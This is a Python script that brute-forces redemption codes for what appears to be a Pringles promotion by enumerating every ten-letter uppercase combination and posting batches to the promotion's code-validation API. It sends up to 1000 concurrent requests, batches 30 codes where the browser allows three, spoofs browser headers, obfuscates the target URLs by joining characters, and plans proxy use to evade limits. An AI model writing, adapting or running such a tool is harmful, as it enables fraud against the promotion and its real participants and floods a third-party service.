#! /usr/bin/env python
# -*- coding: utf-8 -*-

import time
import math
from string import ascii_uppercase
from collections import deque
from itertools import product

import asyncio
import aiohttp
import aiofiles


USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
             'Chrome/61.0.3163.100 Safari/537.36'
REFERER = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'p', 'e', 'a', 'k', 'e', 'r', '.', 'p', 'r', 'i', 'n',
                   'g', 'l', 'e', 's', '.', 'c', 'o', 'm', '/', 'r', 'u', '_', 'R', 'U', '/', 'H', 'o', 'm', 'e'])
URL = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'p', 'e', 'a', 'k', 'e', 'r', '.', 'p', 'r', 'i', 'n', 'g',
               'l', 'e', 's', '.', 'c', 'o', 'm', '/', 'a', 'p', 'i', '/', 'r', 'u', '_', 'R', 'U', '/', 'r', 'e', 'd',
               'e', 'm', 'p', 't', 'i', 'o', 'n', '/', 'v', 'a', 'l', 'i', 'd', 'a', 't', 'e', '-', 'c', 'o', 'd', 'e',
               's'])   # mooore security =))
VALID_RESPONSE = 'Valid'
INVALID_RESPONSE = 'Invalid'
USED_RESPONSE = ''.join(['R', 'e', 'd', 'e', 'e', 'm', 'e', 'd'])


CODE_PREFIX = ''
CODE_CHARS = ascii_uppercase
CODE_LEN = 10

MAX_SIMULTANEOUSLY_REQUEST = 1000
CODES_PER_TASK_MIN = 3
CODES_PER_TASK_MAX = 30  # three is limitation in browser, but we can more
MAX_CLIENTS = int(MAX_SIMULTANEOUSLY_REQUEST / CODES_PER_TASK_MAX)

DEBUG = False

try:
    from config_local import *
except ImportError:
    pass


assert CODES_PER_TASK_MAX >= CODES_PER_TASK_MIN

# todo proxy server =)
# todo compare speed bulk vs minimal validation request
# todo storage to db?
# todo storage to fs?
# todo revalidate success codes


class Storage(object):

    codes = deque()
    valid_codes = []
    invalid_codes = []

    def __init__(self):
        combination_len = CODE_LEN - len(CODE_PREFIX)
        log('Generate code by len %s' % combination_len)
        for comination in product(CODE_CHARS, repeat=combination_len):
            code = '%s%s' % (CODE_PREFIX, ''.join(comination))
            log('add code %s' % code)
            self.codes.append(code)
        log('Gen %d codes' % len(self.codes))

    def get_code_for_check(self):
        return self.codes.pop()

    def save_parsed_code(self, code: str, valid: bool):
        if valid:
            self.valid_codes.append(code)
        else:
            self.invalid_codes.append(code)


def log(msg, force=False):
    # todo use logging
    if DEBUG or force:
        print(msg)


async def task(pid, storage: Storage, sem: asyncio.Semaphore):
    async with sem:
        log('Task {} started'.format(pid))
        start = time.time()
        codes = []
        for i in range(CODES_PER_TASK_MAX):
            try:
                codes.append(storage.get_code_for_check())
            except IndexError:
                pass

        if len(codes) < CODES_PER_TASK_MIN:
            log('skip task by not found codes %s' % codes, True)
            return

        async with aiohttp.ClientSession() as session:
            async with session.post(URL, data={'codes': codes},
                                    headers={'User-Agent': USER_AGENT, 'Referer': REFERER}) as resp:
                response_json = await resp.json()
                log('Process {}: {} {}, took: {:.2f} seconds'.format(
                    pid, codes, response_json, time.time() - start))

                for i, r in enumerate(response_json['result']):
                    if not codes[i]:
                        continue

                    is_valid = r['status'] == VALID_RESPONSE
                    log('save code %s %s' % (codes[i], int(is_valid)))
                    storage.save_parsed_code(codes[i], is_valid)

                    if is_valid:
                        log('WINNER %s' % codes[i], True)

                    if r['status'] not in {VALID_RESPONSE, INVALID_RESPONSE, USED_RESPONSE}:
                        log('UNKNOWN STATUS %s' % r['status'], True)


async def run():
    storage = Storage()
    sem = asyncio.Semaphore(MAX_CLIENTS)
    task_count = math.ceil(len(storage.codes) / CODES_PER_TASK_MAX)
    log('Create %d tasks' % task_count, True)
    start_time = time.time()

    # noinspection PyTypeChecker
    tasks = [asyncio.ensure_future(task(i, storage, sem)) for i in range(task_count)]
    await asyncio.wait(tasks)

    end_time_in_sec = time.time() - start_time
    log("Process took: %.2f seconds (%.2f req/sec)" % (
        end_time_in_sec, (len(storage.invalid_codes) + len(storage.valid_codes)) / end_time_in_sec), True)
    log('Result: invalid codes %d; valid codes %d; codes (%s)' % (len(storage.invalid_codes), len(storage.valid_codes),
                                                                  storage.valid_codes), True)


if __name__ == '__main__':
    log('Start %s clients per %s codes max:' % (MAX_CLIENTS, CODES_PER_TASK_MAX), True)
    ioloop = asyncio.get_event_loop()
    ioloop.run_until_complete(run())
    ioloop.close()
